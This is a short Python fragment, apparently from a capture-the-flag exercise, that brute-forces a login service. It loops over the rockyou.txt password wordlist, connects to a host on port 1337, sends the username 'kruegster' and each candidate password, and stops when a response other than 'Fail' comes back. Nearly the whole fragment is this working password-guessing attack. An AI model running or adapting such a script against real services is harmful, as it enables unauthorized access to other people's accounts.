...
port = 1337 # Port here
wordlist = "C:/Users/Tarun/Downloads/rockyou.txt" # Point to wordlist file
...
for password in file:
    ...
    s.connect((host, port))
    data = s.recv(1024)
    s.send("kruegster\n".encode())  #sending username in as byte
    data2 = s.recv(1024)
    s.send(password.encode())
    data3 = s.recv(1024)
    if(data3 == "Fail\n".encode()):
        print("Fail " + str(x) + " " + password)
        x+= 1
    else:
        print("Correct " + str(x) + " " + password)
        break
